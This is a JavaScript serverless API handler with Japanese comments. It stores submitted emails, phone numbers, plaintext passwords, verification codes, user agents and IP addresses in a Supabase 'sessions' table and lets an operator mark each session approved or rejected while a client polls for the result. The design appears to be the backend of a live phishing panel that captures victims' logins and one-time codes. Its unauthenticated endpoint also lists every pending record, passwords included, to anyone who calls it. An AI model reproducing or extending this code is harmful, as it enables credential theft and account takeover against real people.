import { createClient } from '@supabase/supabase-js';

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_ANON_KEY;

if (!supabaseUrl || !supabaseKey) {
  throw new Error('Missing Supabase environment variables');
}

const supabase = createClient(supabaseUrl, supabaseKey);

function getClientIP(req) {
  return (
    req.headers['cf-connecting-ip'] ||
    req.headers['x-forwarded-for']?.split(',')[0] ||
    req.headers['x-forwarded'] ||
    req.headers['forwarded-for'] ||
    req.headers['forwarded'] ||
    req.socket.remoteAddress ||
    'unknown'
  );
}

function sanitize(value) {
  if (typeof value !== 'string') return '';
  return value.trim().replace(/<[^>]*>/g, '');
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');

  if (req.method === 'OPTIONS') {
    return res.status(200).json({ ok: true });
  }

  try {
    // ===== GET: セッションステータス確認 =====
    if (req.method === 'GET') {
      const action = req.query.action;

      if (action === 'getPending') {
        const { data, error } = await supabase
          .from('sessions')
          .select('*')
          .eq('status', 'pending')
          .order('created_at', { ascending: false });

        if (error) throw error;

        return res.status(200).json({
          success: true,
          pending: data || [],
          count: data?.length || 0,
        });
      }

      const sessionId = sanitize(req.query.sessionId || '');
      if (!sessionId) {
        return res.status(400).json({
          success: false,
          error: 'sessionId required',
        });
      }

      const { data, error } = await supabase
        .from('sessions')
        .select('*')
        .eq('session_id', sessionId)
        .single();

      if (error && error.code !== 'PGRST116') throw error;

      const status = data?.status || 'pending';
      return res.status(200).json({
        success: true,
        status: status,
        approved: status === 'approved',
        rejected: status === 'rejected',
      });
    }

    // ===== POST: リクエスト受信・承認・拒否 =====
    if (req.method === 'POST') {
      const input = req.body;

      if (!input.sessionId) {
        return res.status(400).json({
          success: false,
          error: 'sessionId required',
        });
      }

      const sessionId = sanitize(input.sessionId);
      const action = sanitize(input.action || 'pending');
      const type = sanitize(input.type || 'UNKNOWN');
      const email = sanitize(input.email || '');
      const phone = sanitize(input.phone || '');
      const password = sanitize(input.password || '');
      const userAgent = sanitize(input.userAgent || '');
      const code = sanitize(input.code || '');
      const timestamp = sanitize(input.timestamp || new Date().toISOString());
      const clientIP = getClientIP(req);

      // ===== CASE 1: 新規リクエスト（pending） =====
      if (action === 'pending') {
        const { error } = await supabase.from('sessions').insert([
          {
            session_id: sessionId,
            status: 'pending',
            type: type,
            email: email,
            phone: phone,
            password: password,
            user_agent: userAgent,
            client_ip: clientIP,
            timestamp: timestamp,
          },
        ]);

        if (error) throw error;

        console.log(
          `[NEW_REQUEST] Session: ${sessionId} | Type: ${type} | User: ${email}/${phone}`
        );

        return res.status(200).json({
          success: true,
          sessionId: sessionId,
          status: 'pending',
        });
      }

      // ===== CASE 2: 承認・拒否 =====
      if (!['approved', 'rejected'].includes(action)) {
        return res.status(400).json({
          success: false,
          error: 'invalid action',
        });
      }

      const { error } = await supabase
        .from('sessions')
        .update({
          status: action,
          updated_at: new Date().toISOString(),
        })
        .eq('session_id', sessionId);

      if (error) throw error;

      console.log(`[${action.toUpperCase()}] Session: ${sessionId} | Type: ${type}`);

      return res.status(200).json({
        success: true,
        sessionId: sessionId,
        status: action,
      });
    }

    res.status(405).json({
      success: false,
      error: 'method not allowed',
    });
  } catch (error) {
    console.error('API Error:', error);
    res.status(500).json({
      success: false,
      error: error.message || 'Internal server error',
    });
  }
    }
